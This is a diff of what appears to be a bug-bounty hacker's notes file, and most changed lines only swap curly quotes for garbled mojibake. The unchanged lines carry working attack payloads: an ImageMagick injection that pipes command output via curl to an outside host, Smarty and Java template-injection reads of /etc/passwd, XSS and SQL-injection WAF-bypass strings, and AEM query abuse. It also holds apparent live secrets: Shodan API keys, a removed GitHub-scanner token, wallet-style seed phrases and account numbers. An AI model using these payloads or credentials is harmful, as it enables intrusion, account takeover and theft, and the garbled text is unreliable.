@@ -70,7 +70,7 @@ image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id | curl http://SOMEIPADDRESS:80
 80/ -d @- > /dev/null`'
 pop graphic-context
 
-{php}$s=file_get_contents(‘/etc/passwd’);var_dump($s);{/php}.
+{php}$s=file_get_contents(â€˜/etc/passwdâ€™);var_dump($s);{/php}.
 
 export HOME=`perl -e 'printf "a" x 2000'`
 Comment got posted WITHOUT moderator's approval
@@ -81,26 +81,26 @@ couchdb    _utils/
 Adobe AEM /?debug=layout
 AEM searches
 type=nt:file&nodename=*.zip
-• path=/home&p.hits=full&p.limit=-1
-• hasPermission=jcr:write&path=/content
-• hasPermission=jcr:addChildNodes&path=/content
-• hasPermission=jcr:modifyProperties&path=/content
-• p.hits=selective&p.properties=jcr%3alastModifiedBy&property=jcr%3alast
+â€¢ path=/home&p.hits=full&p.limit=-1
+â€¢ hasPermission=jcr:write&path=/content
+â€¢ hasPermission=jcr:addChildNodes&path=/content
+â€¢ hasPermission=jcr:modifyProperties&path=/content
+â€¢ p.hits=selective&p.properties=jcr%3alastModifiedBy&property=jcr%3alast
 ModifiedBy&property.operation=unequals&property.value=admin&type=n
 t%3abase&p.limit=1000
-• path=/etc&path.flat=true&p.nodedepth=0
-• path=/etc/replication/agents.author&p.hits=full&p.nodedepth=-1
-smarty {php}$s=file_get_contents(‘/etc/passwd’);var_dump($s);{/php} 
+â€¢ path=/etc&path.flat=true&p.nodedepth=0
+â€¢ path=/etc/replication/agents.author&p.hits=full&p.nodedepth=-1
+smarty {php}$s=file_get_contents(â€˜/etc/passwdâ€™);var_dump($s);{/php} 
 
 
 Having the ' in the signature will cause you to miss attacks that don't utilize the ' - 
 1=1 is not the only way to create a query that returns "true" (ex: 2=2, 1<2, etc) 
 
-a. Use ‘+’ in place of all spaces;
-b. Use “%20” in place of all spaces;
+a. Use â€˜+â€™ in place of all spaces;
+b. Use â€œ%20â€ in place of all spaces;
 11 | P a g e h t t p : / / 3 n c r y p t 0 r . b l o g s p o t . c o m
-c. Use “/*” In the end instead of “--“;
-d. Use “/*!” before each keyword and “*/” after each keyword.
+c. Use â€œ/*â€ In the end instead of â€œ--â€œ;
+d. Use â€œ/*!â€ before each keyword and â€œ*/â€ after each keyword.
 e. Use random Case sensitiveness; 
 Grab the database user with USER 
 Grab the database name with DB_NAME 
@@ -160,7 +160,7 @@ rib minimum pattern deer illegal program help arrow fence pool vital turn
 
 supreme key must label say funny scorpion endless spray casual squeeze choose
 alert`1`
-“accesskey=’X’ onclick=’alert(1)’”
+â€œaccesskey=â€™Xâ€™ onclick=â€™alert(1)â€™â€
 X-Forwarded-For
 
 Content-Length: 50
@@ -199,7 +199,7 @@ Host: host:XSS as port
 <something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
 </body>
 </html>
-„> <img src = x onerror = javascript: alert (1); 
+â€ž> <img src = x onerror = javascript: alert (1); 
 Set Wireless Router name to XSS
 
 "><script src=https://{$handle}.xss.ht></script
@@ -255,12 +255,12 @@ accesskey
 
 extension:sql mysql dump
 filename:.env MAIL_HOST=smtp.gmail.com
- GitHub filter to 'Recently indexed’,
+ GitHub filter to 'Recently indexedâ€™,
  
  
  subscriptionId=793c6e67-16f2-494d-b0b2-ab7d1af8a5d3
 
-export GITROB_ACCESS_TOKEN=0ba0dac247689f8d936ce033010f1ae6705e1c36
+export GITROB_ACCESS_TOKEN=
 
 Hi, Please inform webdotcom to provision my userid  jamesbond2019  in https://www.networksolutions.com so that I can test their website features.
 Use "phoneNumber":"0555393457","accountId":"752274895" for sosh.fr
@@ -278,7 +278,7 @@ https://azure.microsoft.com/en-us/get-started/welcome-to-azure/?subscriptionId=0
 
 
 If you get 401 error, website may be using 
-Authorization: Basic §YWRtaW46cGFzc3dvcmQ=§
+Authorization: Basic Â§YWRtaW46cGFzc3dvcmQ=Â§
 Crack using Burp Intruder.
 https://help.realself.com/hc/en-us/requests/454248
 If you get 500 error, try xsstrike, dirbuster, etc, tools.
@@ -331,7 +331,7 @@ then specify input using postman to make it crash/hang/inject SQL
 
 Search for wp- to check presence of wordpress
 
-router/file-process.php?action=…&file_path=/wp-config.php
+router/file-process.php?action=â€¦&file_path=/wp-config.php
 
 SQL injection causes infinite reload. Reported to Paytm on 22/11/2018
 https://apiproxy.paytm.com/shop/search/?q=%5Ba-z%5D&from=organic
@@ -395,7 +395,7 @@ Attack date/time/redirect_uri parameters
 1434 
  Microsoft SQL Server over TCP/IP Redirector 
  
-1521–1530 
+1521â€“1530 
  Oracle 
  
 1944 
@@ -495,7 +495,7 @@ ${{7*7}}
 ${class.getClassLoader()}
 ${class.getResource("").getPath()}
 ${class.getResource("../../../../../index.htm").getContent()}
-Retrieve the system’s environment variables
+Retrieve the systemâ€™s environment variables
 ${T(java.lang.System).getenv()}
 Retrieve /etc/passwd
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
@@ -669,15 +669,15 @@ https://api.shodan.io/shodan/host/search?key=P6DismsMDH04p3i06eIhOmvtFVmz1Lgb&qu
 
 https://api.shodan.io/shodan/host/search?key=priC0c2fKSobk4fnsT7xT76svsgGKziH
 
-* g – \u011f
-* G – \u011e
-* i – \u0131
-* I – \u0130
-* ö – \u00f6
-* Ö – \u00d6
-* ü – \u00fc
-* Ü – \u00dc
-* s – \u015f
-* S – \u015e
-* ç – \u00e7
-* Ç – \u00c7
+* g â€“ \u011f
+* G â€“ \u011e
+* i â€“ \u0131
+* I â€“ \u0130
+* Ã¶ â€“ \u00f6
+* Ã– â€“ \u00d6
+* Ã¼ â€“ \u00fc
+* Ãœ â€“ \u00dc
+* s â€“ \u015f
+* S â€“ \u015e
+* Ã§ â€“ \u00e7
+* Ã‡ â€“ \u00c7
